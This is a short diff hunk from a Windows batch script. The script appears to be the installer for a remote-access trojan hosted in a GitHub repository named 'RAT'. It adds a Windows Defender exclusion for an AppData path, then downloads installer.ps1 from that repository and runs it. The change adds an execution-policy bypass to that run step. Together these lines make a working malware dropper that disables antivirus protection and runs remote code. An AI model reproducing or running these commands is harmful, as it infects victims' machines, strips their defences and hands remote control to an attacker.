@@ -35,4 +35,4 @@ powershell -command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppDat
 
 REM Download and run PowerShell script
 powershell -command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1"
-powershell -File .\installer.ps1
+powershell -ep bypass -File .\installer.ps1
